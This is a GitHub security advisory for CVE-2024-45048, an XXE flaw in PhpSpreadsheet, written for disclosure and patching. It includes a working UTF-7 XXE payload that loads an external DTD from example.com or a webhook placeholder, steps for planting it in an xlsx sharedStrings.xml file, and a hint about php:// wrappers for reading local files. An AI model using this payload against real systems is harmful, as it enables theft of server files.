# [H] XXE in PHPSpreadsheet encoding is returned

## Summary
Severity: High
Advisory: GHSA-ghg6-32f9-2jp7
CVE: CVE-2024-45048
CWE: CWE-611
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-08-29
Source: https://github.com/advisories/GHSA-ghg6-32f9-2jp7
Type: github-advisory

## Affected
- Packagist: `phpoffice/phpspreadsheet` — affected >=0 <1.29.1
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.2.0 <2.2.1
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.0.0 <2.1.1
- Packagist: `phpoffice/phpexcel` — affected >=0

## Details
### Summary
Bypassing the filter allows a XXE-attack. Which is turn allows attacker to obtain contents of local files, even if error reporting muted by @ symbol. (LFI-attack) 

### Details
Check ` $pattern = '/encoding="(.*?)"/';` easy to bypass. Just use a single quote symbol `'`. So payload looks like this:
```
<?xml version="1.0" encoding='UTF-7' standalone="yes"?>
+ADw-!DOCTYPE xxe [+ADw-!ENTITY % xxe SYSTEM "http://example.com/file.dtd"> %xxe;]>
```
If you add this header to any XML file into xlsx-formatted file, such as sharedStrings.xml file, then xxe will execute. 

### PoC
1) Create simple xlsx file
2) Rename xlsx to zip
3) Go to the zip and open the `xl/sharedStrings.xml` file in edit mode.
4) Replace `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>` to 
```
<?xml version="1.0" encoding='UTF-7' standalone="yes"?>
+ADw-!DOCTYPE xxe [+ADw-!ENTITY % xxe SYSTEM "http://%webhook%/file.dtd"> %xxe;]>
```
5) Save `sharedStrings.xml` file and rename zip back to xlsx.
6) Use minimal php code that simply opens this xlsx file:
```
use PhpOffice\PhpSpreadsheet\IOFactory;
require __DIR__ . '/vendor/autoload.php';
$spreadsheet = IOFactory::load("file.xlsx");
```
7) You will receive the request to your `http://%webhook%/file.dtd`
8) Dont't forget that you can use php-wrappers into xxe, some php:// wrapper payload allows fetch local files.

### Impact
Read local files
![lfi](https://github.com/PHPOffice/PhpSpreadsheet/assets/95242087/1839cddb-6bb0-486d-8884-9ac485776931)

## References
- https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-ghg6-32f9-2jp7
- https://nvd.nist.gov/vuln/detail/CVE-2024-45048
- https://github.com/PHPOffice/PhpSpreadsheet/commit/bea2d4b30f24bcc8a7712e208d1359e603b45dda
- https://github.com/PHPOffice/PhpSpreadsheet
